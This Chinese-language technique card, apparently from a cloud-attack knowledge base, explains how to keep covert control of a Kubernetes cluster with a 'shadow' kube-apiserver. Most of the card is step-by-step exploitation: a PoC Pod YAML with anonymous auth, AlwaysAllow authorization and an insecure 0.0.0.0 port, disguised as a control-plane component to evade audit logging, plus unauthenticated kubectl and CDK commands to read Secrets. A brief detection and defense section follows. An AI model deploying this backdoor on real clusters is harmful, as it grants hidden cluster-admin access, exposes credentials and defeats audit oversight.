---
id: cloud-k8s-shadow-apiserver-anonymous-persistence
title: K8s Shadow API Server 持久化：复制 kube-apiserver 起一个 AlwaysAllow + 匿名 insecure 端口的影子控制面，绕过原 API Server 审计
type: scenario
domain: cloud
path: cloud/k8s
technique: k8s-shadow-apiserver-persistence
aliases:
- Shadow API Server
- 影子 API Server
- k8s-shadow-apiserver
- kube-apiserver-shadow
- AlwaysAllow 影子控制面
- 隐蔽持久化
tags:
- cloud
- k8s
- persistence
- apiserver
- anonymous
- alwaysallow
- stealth
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V673
  verified_at: '2026-11-13T10:33:20+08:00'
  notes: 已对照原文 YAML 核对：AlwaysAllow + anonymous-auth + insecure 端口与 0.0.0.0 绑定、复用 etcd/证书、ownerReferences/接口与原文一致；原文文本端口 6445 与最终 yaml 9443/9444 的不一致已在卡内注明；insecure 端口为明文 HTTP，已修正卡内验证步骤为 http。原文该节截图为外链（本地 img 无对应图），未复现，confidence 保持 medium。
---

## 一句话结论

在已获得高权限（可创建 kube-system 工作负载/读取控制面配置）的前提下，攻击者可复制原 kube-apiserver Pod 的 YAML，改造出一个新的 "kube-apiserver-shadow" Pod：复用同一套 etcd/证书与 hostPath，开启 `--anonymous-auth=true`、`--authorization-mode=AlwaysAllow`，并在 `0.0.0.0` 上开放 insecure 端口。此后集群内任意 Pod 都能通过该影子控制面无凭证管理集群，而原有 API Server 不记录这些操作，且 Pod 的 `restartPolicy: Always` 让控制通道长期存活。

## 原理

- **为什么需要影子控制面**：直接使用原 API Server 的高权限 SA/凭据容易在原审计日志中留下痕迹，且原凭据可能轮换/被回收。Shadow API Server 是一个**独立进程**，连的是同一个 etcd、使用同一套证书，但鉴权策略是 `AlwaysAllow` 且开了匿名 insecure 端口，等于给攻击者留了一个不受原审计约束的后门控制面。
- **构造方式**：`kubectl get pods -n kube-system kube-apiserver-master -o yaml` 拿到原控制面 Pod 定义，复制后修改：
  - `--allow-privileged=true`；
  - `--insecure-port=<port>`、`--insecure-bind-address=0.0.0.0`（原文文本写 6445，yaml 中实际为 9443/`--secure-port=9444`，以实际环境为准）；
  - `--anonymous-auth=true`、`--authorization-mode=AlwaysAllow`；
  - 删除 `status`、`metadata.selfLink/uid/annotations/resourceVersion/creationTimestamp`、`spec.tolerations` 等由集群管理的字段；
  - `hostNetwork: true`、`nodeName: master`、`priorityClassName: system-cluster-critical`，挂载 `/etc/kubernetes/pki`、`/etc/ssl/certs`、`/etc/pki` 等原证书/配置目录。
- **为什么能无凭证访问**：`--anonymous-auth=true` 让未认证请求以 `system:anonymous` 身份进入，`--authorization-mode=AlwaysAllow` 则对该身份放行所有 API；insecure 端口本身不走 TLS 客户端证书。因此集群内任意能访问该端口的 Pod（甚至外部，若网络可达）都可 `kubectl -s http://<node>:<port>` 管理集群。
- **为什么隐蔽且持久**：Pod 归属 `kube-system`、名字/标签伪装成控制面组件（`component: kube-apiserver-shadow`、`tier: control-plane`、`ownerReferences` 指向 Node），原 API Server 的审计日志只记录 Pod 创建这一件事，后续通过影子端口的操作不会进入原审计流；`restartPolicy: Always` + 控制器/静态属性使其持续运行。
- **影响**：攻击者可通过影子控制面读取所有 Secret（集群凭据、云密钥、镜像仓库口令）、创建特权 Pod 逃逸、横向等，等价于集群管理员。

## 触发条件

- 攻击者已具备创建 Pod/工作负载到 `kube-system`（或能以 system-cluster-critical 优先级、hostNetwork、hostPath 创建 Pod）的高权限，能读取原 kube-apiserver Pod 定义。
- 控制面节点允许再起一个 kube-apiserver 进程（资源、端口、证书/etcd 可达）。
- 影子 insecure 端口可从攻击者/目标 Pod 网络访问；NetworkPolicy 未阻断。
- 仅限授权测试。

## 利用步骤

1. `kubectl get pods -n kube-system | grep kube-apiserver` 确认控制面 Pod；`kubectl get pods -n kube-system kube-apiserver-master -o yaml` 导出定义。
2. 复制并修改 YAML：加入 `--allow-privileged=true`、`--anonymous-auth=true`、`--authorization-mode=AlwaysAllow`、insecure 端口与 `0.0.0.0` 绑定；删除 status/metadata 运行时字段与 tolerations；确保 `hostNetwork: true`、`nodeName: master`、证书和 etcd 配置挂载正确。
3. `kubectl create -f api.yaml` 创建 `kube-apiserver-shadow` Pod；确认 Pod Running、端口监听。
4. 未授权验证：浏览器访问 `http://<node>:<insecure-port>/`（insecure 端口为明文 HTTP）或 `kubectl -s http://<node>:<insecure-port> get nodes` 无需任何凭据即返回集群资源。
5. 通过影子控制面读取 Secret、创建特权 Pod 等；原文用 CDK：先 `cdk evaluate` 发现高权限 SA，再 `cdk run k8s-shadow-apiserver default` 部署，随后从影子 API 拉取 Secrets。
6. 持久化：Pod 的 `restartPolicy: Always` 使其随节点/进程重启恢复；清理需删除该 Pod 并排查是否还有类似伪装的控制面工作负载。

## PoC

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: kube-apiserver-shadow
  namespace: kube-system
  labels:
    component: kube-apiserver-shadow
    tier: control-plane
spec:
  hostNetwork: true
  nodeName: master
  priorityClassName: system-cluster-critical
  restartPolicy: Always
  containers:
  - name: kube-apiserver
    image: registry.aliyuncs.com/google_containers/kube-apiserver:v1.17.4
    command:
    - kube-apiserver
    - --allow-privileged=true
    - --anonymous-auth=true
    - --authorization-mode=AlwaysAllow
    - --insecure-port=9443
    - --insecure-bind-address=0.0.0.0
    # ... 复用原 --etcd-servers / --client-ca-file / --tls-* 等参数与 hostPath 挂载
```

```bash
kubectl create -f api.yaml
kubectl -s http://192.168.17.144:9443 get nodes    # 无凭证
```

原文实测（工具 Section 使用 CDK）：`cdk evaluate` 发现高权限 SA 后 `cdk run k8s-shadow-apiserver default` 部署成功，任意 Pod 可向影子 API 发请求并读取 Secrets；本地图片未收录该节截图，故置信度 medium。

## 变体与关联

- 变体：可改 `--secure-port` + `--anonymous-auth=true`/AlwaysAllow 而不开 insecure 端口；也可用 `kubectl proxy`/静态 Pod manifest 写入控制面节点等方式构造影子入口；CDK 的 `k8s-shadow-apiserver` 是该技术的工具化实现。
- 关联：[[cloud-k8s-k8s-apiserver-anonymous-access]]（原 API Server 自身匿名/8080 不安全端口，与本卡"另起影子实例"不同）、[[cloud-k8s-workload-controller-backdoor-persistence-privileged-pod]]（工作负载持久化）、[[cloud-k8s-control-plane-ca-system-masters-cert-forge]]（控制面证书滥用）。
- 边界：需要高权限创建 kube-system/hostNetwork Pod 与访问控制面证书；严格准入（禁止 hostPath/hostNetwork、限制 kube-system 写权限）和端口暴露限制可阻断；对比原 API Server 审计可发现影子 Pod 的创建事件。

## 检测与防御

- **防御**：严格控制谁能创建 kube-system/hostNetwork/hostPath Pod；启用 PodSecurity/OPA 禁止此类工作负载；限制 insecure 端口与 0.0.0.0 绑定（新版本已默认禁用 insecure port）；监控控制面节点的额外 apiserver 进程/端口。
- **检测**：kube-system 出现非官方命名的 kube-apiserver Pod（如 `kube-apiserver-shadow`）、带 `--anonymous-auth=true`/`AlwaysAllow` 参数的工作负载；节点上出现额外 `kube-apiserver` 监听端口；API 审计中 Pod create 事件指向伪造控制面；从影子端口产生的请求不在原审计日志中。
- **注意**：影子控制面连的是同一 etcd，读到的 Secret 与真实集群一致；发现后需立即删除 Pod、轮换集群凭据并审计所有 Secret 访问。
